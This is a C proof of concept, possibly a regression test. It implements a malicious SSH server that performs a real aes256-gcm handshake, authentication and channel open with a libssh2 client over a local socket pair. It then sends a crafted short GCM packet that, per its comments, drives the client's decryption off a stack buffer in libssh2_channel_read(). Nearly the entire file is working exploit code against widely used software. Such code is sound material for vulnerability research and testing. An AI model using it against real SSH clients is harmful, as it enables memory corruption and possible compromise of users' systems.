/*
 * Malicious SSH peer on an aes256-gcm session. After a normal handshake,
 * userauth and channel open, the peer sends one packet whose length field
 * makes the last AES-GCM decrypt chunk shorter than the authentication tag.
 * Reached through libssh2_channel_read().
 */
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>

#include <openssl/bn.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#include <libssh2.h>

#define SSH_MSG_SERVICE_REQUEST           5
#define SSH_MSG_SERVICE_ACCEPT            6
#define SSH_MSG_KEXINIT                   20
#define SSH_MSG_NEWKEYS                   21
#define SSH_MSG_KEX_ECDH_REPLY            31
#define SSH_MSG_USERAUTH_REQUEST          50
#define SSH_MSG_USERAUTH_SUCCESS          52
#define SSH_MSG_CHANNEL_OPEN              90
#define SSH_MSG_CHANNEL_OPEN_CONFIRMATION 91

static void die(const char *what)
{
    fprintf(stderr, "server: %s\n", what);
    exit(2);
}

static void die_ssl(const char *what)
{
    fprintf(stderr, "server: %s\n", what);
    exit(2);
}

static void wr_full(int fd, const void *buf, size_t n)
{
    const unsigned char *p = buf;
    while(n) {
        ssize_t k = write(fd, p, n);
        if(k < 0) {
            if(errno == EINTR)
                continue;
            die("write");
        }
        p += k;
        n -= (size_t)k;
    }
}

static void rd_full(int fd, void *buf, size_t n)
{
    unsigned char *p = buf;
    while(n) {
        ssize_t k = read(fd, p, n);
        if(k < 0) {
            if(errno == EINTR)
                continue;
            die("read");
        }
        if(k == 0)
            die("eof");
        p += k;
        n -= (size_t)k;
    }
}

static void put_u32(unsigned char *p, uint32_t v)
{
    p[0] = (unsigned char)(v >> 24);
    p[1] = (unsigned char)(v >> 16);
    p[2] = (unsigned char)(v >> 8);
    p[3] = (unsigned char)v;
}

static uint32_t get_u32(const unsigned char *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

/* Unencrypted SSH packet, block size 8, minimum padding 4. */
static void send_plain(int fd, const unsigned char *payload, size_t len)
{
    size_t packet_length = len + 1 + 4;
    size_t pad = 8 - (packet_length % 8);
    unsigned char *pkt;
    size_t total;

    if(pad < 4)
        pad += 8;
    packet_length += pad;
    total = packet_length; /* includes the 4-byte length field */
    pkt = calloc(1, total);
    if(!pkt)
        die("oom");
    put_u32(pkt, (uint32_t)(packet_length - 4));
    pkt[4] = (unsigned char)pad;
    memcpy(pkt + 5, payload, len);
    RAND_bytes(pkt + 5 + len, (int)pad);
    wr_full(fd, pkt, total);
    free(pkt);
}

static unsigned char *recv_plain(int fd, size_t *out_len)
{
    unsigned char hdr[4];
    uint32_t rest;
    unsigned char *buf, *payload;
    unsigned pad;
    size_t plen;

    rd_full(fd, hdr, 4);
    rest = get_u32(hdr);
    if(rest < 1 || rest > 256 * 1024)
        die("bad plain length");
    buf = malloc(rest);
    if(!buf)
        die("oom");
    rd_full(fd, buf, rest);
    pad = buf[0];
    if(pad > rest - 1)
        die("bad padding");
    plen = rest - 1 - pad;
    payload = malloc(plen ? plen : 1);
    if(!payload)
        die("oom");
    if(plen)
        memcpy(payload, buf + 1, plen);
    free(buf);
    *out_len = plen;
    return payload;
}

struct gcm {
    EVP_CIPHER_CTX *ctx;
};

static void gcm_init(struct gcm *g, const unsigned char *key,
                     const unsigned char *iv, int enc)
{
    g->ctx = EVP_CIPHER_CTX_new();
    if(!g->ctx)
        die_ssl("ctx");
    if(EVP_CipherInit(g->ctx, EVP_aes_256_gcm(), key, iv, enc) != 1)
        die_ssl("cipherinit");
    if(EVP_CIPHER_CTX_ctrl(g->ctx, EVP_CTRL_AEAD_SET_IV_FIXED, -1,
                           (void *)iv) != 1)
        die_ssl("ivfixed");
}

/* One AES-GCM SSH packet, matching libssh2's encrypt framing. */
static void send_gcm(int fd, struct gcm *g, const unsigned char *payload,
                     size_t len)
{
    size_t packet_length = len + 1 + 4;
    size_t pad = 16 - ((packet_length - 4) % 16);
    unsigned char lenb[4];
    unsigned char *plain, *ct, tag[16];
    unsigned char lastiv[1];
    size_t ct_len;

    if(pad < 4)
        pad += 16;
    packet_length += pad;
    ct_len = packet_length - 4;
    plain = calloc(1, ct_len);
    ct = malloc(ct_len);
    if(!plain || !ct)
        die("oom");
    plain[0] = (unsigned char)pad;
    memcpy(plain + 1, payload, len);
    RAND_bytes(plain + 1 + len, (int)pad);
    put_u32(lenb, (uint32_t)ct_len);

    if(EVP_CIPHER_CTX_ctrl(g->ctx, EVP_CTRL_GCM_IV_GEN, 1, lastiv) != 1)
        die_ssl("ivgen");
    if(EVP_Cipher(g->ctx, NULL, lenb, 4) < 0)
        die_ssl("aad");
    if(EVP_Cipher(g->ctx, ct, plain, (int)ct_len) < 0)
        die_ssl("enc");
    if(EVP_Cipher(g->ctx, NULL, NULL, 0) < 0)
        die_ssl("final");
    if(EVP_CIPHER_CTX_ctrl(g->ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1)
        die_ssl("tag");

    wr_full(fd, lenb, 4);
    wr_full(fd, ct, ct_len);
    wr_full(fd, tag, 16);
    free(plain);
    free(ct);
}

/*
 * Packet whose plaintext length is shorter than a cipher block. The first
 * decrypted byte (padding length) is 0 so the transport accepts it; the
 * trailing chunk presented to the cipher is then shorter than the GCM tag.
 */
static void send_short_gcm(int fd, struct gcm *g)
{
    unsigned char lenb[4];
    unsigned char plain[8];
    unsigned char ct[8];
    unsigned char tag[16];
    unsigned char lastiv[1];

    memset(plain, 0, sizeof(plain));
    put_u32(lenb, 8);

    if(EVP_CIPHER_CTX_ctrl(g->ctx, EVP_CTRL_GCM_IV_GEN, 1, lastiv) != 1)
        die_ssl("ivgen");
    if(EVP_Cipher(g->ctx, NULL, lenb, 4) < 0)
        die_ssl("aad");
    if(EVP_Cipher(g->ctx, ct, plain, 8) < 0)
        die_ssl("enc");
    if(EVP_Cipher(g->ctx, NULL, NULL, 0) < 0)
        die_ssl("final");
    if(EVP_CIPHER_CTX_ctrl(g->ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1)
        die_ssl("tag");

    wr_full(fd, lenb, 4);
    wr_full(fd, ct, 8);
    wr_full(fd, tag, 16);
}

static unsigned char *recv_gcm(int fd, struct gcm *g, size_t *out_len)
{
    unsigned char lenb[4];
    uint32_t ct_len;
    unsigned char *ct, *plain, tag[16], lastiv[1];
    unsigned pad;
    size_t plen;

    rd_full(fd, lenb, 4);
    ct_len = get_u32(lenb);
    if(ct_len < 1 || ct_len > 256 * 1024)
        die("bad gcm length");
    ct = malloc(ct_len);
    plain = malloc(ct_len);
    if(!ct || !plain)
        die("oom");
    rd_full(fd, ct, ct_len);
    rd_full(fd, tag, 16);

    if(EVP_CIPHER_CTX_ctrl(g->ctx, EVP_CTRL_GCM_IV_GEN, 1, lastiv) != 1)
        die_ssl("ivgen");
    if(EVP_Cipher(g->ctx, NULL, lenb, 4) < 0)
        die_ssl("aad");
    if(EVP_Cipher(g->ctx, plain, ct, (int)ct_len) < 0)
        die_ssl("dec");
    if(EVP_CIPHER_CTX_ctrl(g->ctx, EVP_CTRL_GCM_SET_TAG, 16, tag) != 1)
        die_ssl("settag");
    if(EVP_Cipher(g->ctx, NULL, NULL, 0) < 0)
        die("gcm tag mismatch");

    pad = plain[0];
    if(pad > ct_len - 1)
        die("bad gcm padding");
    plen = ct_len - 1 - pad;
    if(plen)
        memmove(plain, plain + 1, plen);
    free(ct);
    *out_len = plen;
    return plain;
}

static void hash_str(EVP_MD_CTX *md, const void *p, size_t n)
{
    unsigned char lb[4];
    put_u32(lb, (uint32_t)n);
    if(EVP_DigestUpdate(md, lb, 4) != 1 ||
       EVP_DigestUpdate(md, p, n) != 1)
        die_ssl("hash");
}

static void derive(const unsigned char *k, size_t klen,
                   const unsigned char *h, size_t hlen,
                   char letter, unsigned char *out, size_t outlen)
{
    EVP_MD_CTX *md = EVP_MD_CTX_new();
    unsigned char dig[32];
    unsigned int dlen = 0;

    if(!md)
        die_ssl("md");
    if(EVP_DigestInit_ex(md, EVP_sha256(), NULL) != 1 ||
       EVP_DigestUpdate(md, k, klen) != 1 ||
       EVP_DigestUpdate(md, h, hlen) != 1 ||
       EVP_DigestUpdate(md, &letter, 1) != 1 ||
       EVP_DigestUpdate(md, h, hlen) != 1 ||
       EVP_DigestFinal_ex(md, dig, &dlen) != 1)
        die_ssl("derive");
    EVP_MD_CTX_free(md);
    if(outlen > dlen)
        die("derive len");
    memcpy(out, dig, outlen);
}

static unsigned char *mpint_k(const unsigned char shared[32], size_t *out_len)
{
    BIGNUM *k = BN_bin2bn(shared, 32, NULL);
    int nbytes, bits, k_value_len;
    unsigned char *k_value;

    if(!k)
        die_ssl("bn");
    nbytes = BN_num_bytes(k);
    bits = BN_num_bits(k);
    k_value_len = nbytes + 5;
    if(bits % 8)
        k_value_len--;
    k_value = calloc(1, (size_t)k_value_len);
    if(!k_value)
        die("oom");
    put_u32(k_value, (uint32_t)(k_value_len - 4));
    if(bits % 8) {
        if(BN_bn2bin(k, k_value + 4) <= 0)
            die_ssl("bn2bin");
    }
    else {
        k_value[4] = 0;
        if(BN_bn2bin(k, k_value + 5) <= 0)
            die_ssl("bn2bin");
    }
    BN_free(k);
    *out_len = (size_t)k_value_len;
    return k_value;
}

static void server(int fd)
{
    static const char banner[] = "SSH-2.0-OpenSSH_9.2\r\n";
    static const char kex_algs[] = "curve25519-sha256";
    static const char host_algs[] = "ssh-ed25519";
    static const char crypt_algs[] = "aes256-gcm@openssh.com";
    static const char mac_algs[] = "hmac-sha2-256";
    static const char comp_algs[] = "none";
    unsigned char client_banner[256];
    size_t client_banner_len = 0;
    unsigned char *client_kex = NULL, *server_kex = NULL;
    size_t client_kex_len = 0, server_kex_len = 0;
    unsigned char *init_pkt = NULL;
    size_t init_len = 0;
    unsigned char client_eph[32], server_eph[32], shared[32];
    unsigned char host_pub[32];
    unsigned char *k_value = NULL;
    size_t k_len = 0;
    unsigned char H[32];
    unsigned int Hlen = 0;
    unsigned char sig[64];
    size_t siglen = 64;
    EVP_PKEY *host = NULL, *eph = NULL;
    EVP_PKEY_CTX *kctx = NULL, *dctx = NULL;
    EVP_MD_CTX *md = NULL;
    unsigned char *reply = NULL;
    size_t reply_len, off;
    unsigned char iv_c2s[12], iv_s2c[12], key_c2s[32], key_s2c[32];
    struct gcm dec, enc;
    unsigned char *pkt;
    size_t pkt_len;
    uint32_t client_chan;
    unsigned char confirm[17];
    unsigned char *ks;
    size_t hostblob_len;
    unsigned char hostblob[4 + 11 + 4 + 32];
    char c;

    /* Banners. Client also writes first; both fit in the socket buffer. */
    wr_full(fd, banner, sizeof(banner) - 1);
    do {
        rd_full(fd, &c, 1);
        if(c == '\0')
            die("nul banner");
        if(client_banner_len + 1 >= sizeof(client_banner))
            die("banner");
        client_banner[client_banner_len++] = (unsigned char)c;
    } while(c != '\n');
    while(client_banner_len &&
          (client_banner[client_banner_len - 1] == '\n' ||
           client_banner[client_banner_len - 1] == '\r'))
        client_banner_len--;

    client_kex = recv_plain(fd, &client_kex_len);
    if(client_kex_len < 1 || client_kex[0] != SSH_MSG_KEXINIT)
        die("expected kexinit");

    /* Build our KEXINIT payload (type byte through reserved). */
    {
        size_t n = 1 + 16 +
                   (4 + sizeof(kex_algs) - 1) +
                   (4 + sizeof(host_algs) - 1) +
                   (4 + sizeof(crypt_algs) - 1) +
                   (4 + sizeof(crypt_algs) - 1) +
                   (4 + sizeof(mac_algs) - 1) +
                   (4 + sizeof(mac_algs) - 1) +
                   (4 + sizeof(comp_algs) - 1) +
                   (4 + sizeof(comp_algs) - 1) +
                   4 + 4 + 1 + 4;
        unsigned char *s;
        server_kex = calloc(1, n);
        if(!server_kex)
            die("oom");
        s = server_kex;
        *s++ = SSH_MSG_KEXINIT;
        RAND_bytes(s, 16);
        s += 16;
        put_u32(s, sizeof(kex_algs) - 1); s += 4;
        memcpy(s, kex_algs, sizeof(kex_algs) - 1); s += sizeof(kex_algs) - 1;
        put_u32(s, sizeof(host_algs) - 1); s += 4;
        memcpy(s, host_algs, sizeof(host_algs) - 1); s += sizeof(host_algs) - 1;
        put_u32(s, sizeof(crypt_algs) - 1); s += 4;
        memcpy(s, crypt_algs, sizeof(crypt_algs) - 1); s += sizeof(crypt_algs) - 1;
        put_u32(s, sizeof(crypt_algs) - 1); s += 4;
        memcpy(s, crypt_algs, sizeof(crypt_algs) - 1); s += sizeof(crypt_algs) - 1;
        put_u32(s, sizeof(mac_algs) - 1); s += 4;
        memcpy(s, mac_algs, sizeof(mac_algs) - 1); s += sizeof(mac_algs) - 1;
        put_u32(s, sizeof(mac_algs) - 1); s += 4;
        memcpy(s, mac_algs, sizeof(mac_algs) - 1); s += sizeof(mac_algs) - 1;
        put_u32(s, sizeof(comp_algs) - 1); s += 4;
        memcpy(s, comp_algs, sizeof(comp_algs) - 1); s += sizeof(comp_algs) - 1;
        put_u32(s, sizeof(comp_algs) - 1); s += 4;
        memcpy(s, comp_algs, sizeof(comp_algs) - 1); s += sizeof(comp_algs) - 1;
        put_u32(s, 0); s += 4;
        put_u32(s, 0); s += 4;
        *s++ = 0;
        put_u32(s, 0); s += 4;
        server_kex_len = (size_t)(s - server_kex);
    }
    send_plain(fd, server_kex, server_kex_len);

    init_pkt = recv_plain(fd, &init_len);
    if(init_len < 1 + 4 + 32 || init_pkt[0] != 30)
        die("expected ecdh init");
    if(get_u32(init_pkt + 1) != 32)
        die("eph len");
    memcpy(client_eph, init_pkt + 5, 32);

    kctx = EVP_PKEY_CTX_new_id(EVP_PKEY_X25519, NULL);
    if(!kctx || EVP_PKEY_keygen_init(kctx) != 1 ||
       EVP_PKEY_keygen(kctx, &eph) != 1)
        die_ssl("x25519 keygen");
    {
        size_t l = 32;
        if(EVP_PKEY_get_raw_public_key(eph, server_eph, &l) != 1 || l != 32)
            die_ssl("eph pub");
    }
    {
        EVP_PKEY *peer = EVP_PKEY_new_raw_public_key(EVP_PKEY_X25519, NULL,
                                                     client_eph, 32);
        size_t sl = 32;
        dctx = EVP_PKEY_CTX_new(eph, NULL);
        if(!peer || !dctx ||
           EVP_PKEY_derive_init(dctx) != 1 ||
           EVP_PKEY_derive_set_peer(dctx, peer) != 1 ||
           EVP_PKEY_derive(dctx, shared, &sl) != 1 || sl != 32)
            die_ssl("derive shared");
        EVP_PKEY_free(peer);
    }
    k_value = mpint_k(shared, &k_len);

    kctx = EVP_PKEY_CTX_new_id(EVP_PKEY_ED25519, NULL);
    host = NULL;
    if(!kctx || EVP_PKEY_keygen_init(kctx) != 1 ||
       EVP_PKEY_keygen(kctx, &host) != 1)
        die_ssl("ed25519");
    {
        size_t l = 32;
        if(EVP_PKEY_get_raw_public_key(host, host_pub, &l) != 1 || l != 32)
            die_ssl("host pub");
    }

    /* K_S blob */
    ks = hostblob;
    put_u32(ks, 11); ks += 4;
    memcpy(ks, "ssh-ed25519", 11); ks += 11;
    put_u32(ks, 32); ks += 4;
    memcpy(ks, host_pub, 32); ks += 32;
    hostblob_len = (size_t)(ks - hostblob);

    md = EVP_MD_CTX_new();
    if(!md || EVP_DigestInit_ex(md, EVP_sha256(), NULL) != 1)
        die_ssl("sha");
    hash_str(md, client_banner, client_banner_len);
    hash_str(md, banner, sizeof(banner) - 1 - 2); /* drop CRLF */
    hash_str(md, client_kex, client_kex_len);
    hash_str(md, server_kex, server_kex_len);
    hash_str(md, hostblob, hostblob_len);
    hash_str(md, client_eph, 32);
    hash_str(md, server_eph, 32);
    if(EVP_DigestUpdate(md, k_value, k_len) != 1 ||
       EVP_DigestFinal_ex(md, H, &Hlen) != 1 || Hlen != 32)
        die_ssl("H");
    EVP_MD_CTX_free(md);

    md = EVP_MD_CTX_new();
    if(!md || EVP_DigestSignInit(md, NULL, NULL, NULL, host) != 1 ||
       EVP_DigestSign(md, sig, &siglen, H, 32) != 1 || siglen != 64)
        die_ssl("sign");
    EVP_MD_CTX_free(md);

    /* SSH_MSG_KEX_ECDH_REPLY */
    reply_len = 1 + (4 + hostblob_len) + (4 + 32) + (4 + 4 + 11 + 4 + 64);
    reply = malloc(reply_len);
    if(!reply)
        die("oom");
    off = 0;
    reply[off++] = SSH_MSG_KEX_ECDH_REPLY;
    put_u32(reply + off, (uint32_t)hostblob_len); off += 4;
    memcpy(reply + off, hostblob, hostblob_len); off += hostblob_len;
    put_u32(reply + off, 32); off += 4;
    memcpy(reply + off, server_eph, 32); off += 32;
    put_u32(reply + off, 4 + 11 + 4 + 64); off += 4;
    put_u32(reply + off, 11); off += 4;
    memcpy(reply + off, "ssh-ed25519", 11); off += 11;
    put_u32(reply + off, 64); off += 4;
    memcpy(reply + off, sig, 64); off += 64;
    if(off != reply_len)
        die("reply size");
    send_plain(fd, reply, reply_len);

    pkt = recv_plain(fd, &pkt_len);
    if(pkt_len < 1 || pkt[0] != SSH_MSG_NEWKEYS)
        die("expected newkeys");
    free(pkt);
    {
        unsigned char nk = SSH_MSG_NEWKEYS;
        send_plain(fd, &nk, 1);
    }

    derive(k_value, k_len, H, 32, 'A', iv_c2s, 12);
    derive(k_value, k_len, H, 32, 'B', iv_s2c, 12);
    derive(k_value, k_len, H, 32, 'C', key_c2s, 32);
    derive(k_value, k_len, H, 32, 'D', key_s2c, 32);
    gcm_init(&dec, key_c2s, iv_c2s, 0);
    gcm_init(&enc, key_s2c, iv_s2c, 1);

    pkt = recv_gcm(fd, &dec, &pkt_len);
    if(pkt_len < 1 || pkt[0] != SSH_MSG_SERVICE_REQUEST)
        die("expected service request");
    free(pkt);
    {
        unsigned char acc[1 + 4 + 12];
        unsigned char *s = acc;
        *s++ = SSH_MSG_SERVICE_ACCEPT;
        put_u32(s, 12); s += 4;
        memcpy(s, "ssh-userauth", 12);
        send_gcm(fd, &enc, acc, sizeof(acc));
    }

    pkt = recv_gcm(fd, &dec, &pkt_len);
    if(pkt_len < 1 || pkt[0] != SSH_MSG_USERAUTH_REQUEST)
        die("expected userauth");
    free(pkt);
    {
        unsigned char ok = SSH_MSG_USERAUTH_SUCCESS;
        send_gcm(fd, &enc, &ok, 1);
    }

    pkt = recv_gcm(fd, &dec, &pkt_len);
    if(pkt_len < 1 + 4 + 4 || pkt[0] != SSH_MSG_CHANNEL_OPEN)
        die("expected channel open");
    {
        uint32_t tlen = get_u32(pkt + 1);
        if(5 + tlen + 4 > pkt_len)
            die("channel open truncated");
        client_chan = get_u32(pkt + 5 + tlen);
    }
    free(pkt);

    confirm[0] = SSH_MSG_CHANNEL_OPEN_CONFIRMATION;
    put_u32(confirm + 1, client_chan);
    put_u32(confirm + 5, 0);
    put_u32(confirm + 9, 32768);
    put_u32(confirm + 13, 32768);
    send_gcm(fd, &enc, confirm, sizeof(confirm));

    /* Give the client a moment to return from channel open, then the
       length field that walks the cipher off the stack buffer. */
    usleep(50000);
    send_short_gcm(fd, &enc);

    /* Stay alive until the client reads the packet. */
    sleep(5);
    _exit(0);
}

static int client_main(int fd)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_CHANNEL *channel;
    char buf[64];
    ssize_t n;
    int rc;

    if(libssh2_init(0) != 0) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }
    session = libssh2_session_init();
    if(!session)
        return 2;
    libssh2_session_set_blocking(session, 1);
    if(libssh2_session_method_pref(session, LIBSSH2_METHOD_KEX,
                                   "curve25519-sha256") ||
       libssh2_session_method_pref(session, LIBSSH2_METHOD_HOSTKEY,
                                   "ssh-ed25519") ||
       libssh2_session_method_pref(session, LIBSSH2_METHOD_CRYPT_CS,
                                   "aes256-gcm@openssh.com") ||
       libssh2_session_method_pref(session, LIBSSH2_METHOD_CRYPT_SC,
                                   "aes256-gcm@openssh.com") ||
       libssh2_session_method_pref(session, LIBSSH2_METHOD_MAC_CS,
                                   "hmac-sha2-256") ||
       libssh2_session_method_pref(session, LIBSSH2_METHOD_MAC_SC,
                                   "hmac-sha2-256") ||
       libssh2_session_method_pref(session, LIBSSH2_METHOD_COMP_CS, "none") ||
       libssh2_session_method_pref(session, LIBSSH2_METHOD_COMP_SC, "none")) {
        fprintf(stderr, "method_pref failed\n");
        return 2;
    }

    rc = libssh2_session_handshake(session, fd);
    if(rc) {
        char *msg = NULL;
        libssh2_session_last_error(session, &msg, NULL, 0);
        fprintf(stderr, "handshake %d: %s\n", rc, msg ? msg : "");
        return 2;
    }
    rc = libssh2_userauth_password(session, "user", "password");
    if(rc) {
        char *msg = NULL;
        libssh2_session_last_error(session, &msg, NULL, 0);
        fprintf(stderr, "auth %d: %s\n", rc, msg ? msg : "");
        return 2;
    }
    channel = libssh2_channel_open_session(session);
    if(!channel) {
        char *msg = NULL;
        libssh2_session_last_error(session, &msg, NULL, 0);
        fprintf(stderr, "channel %s\n", msg ? msg : "");
        return 2;
    }

    n = libssh2_channel_read(channel, buf, sizeof(buf));
    fprintf(stderr, "channel_read %zd\n", n);
    libssh2_channel_free(channel);
    libssh2_session_disconnect(session, "done");
    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}

int main(void)
{
    int sv[2];
    pid_t pid;

    if(socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
        perror("socketpair");
        return 2;
    }
    pid = fork();
    if(pid < 0) {
        perror("fork");
        return 2;
    }
    if(pid == 0) {
        close(sv[0]);
        server(sv[1]);
        return 0;
    }
    close(sv[1]);
    return client_main(sv[0]);
}
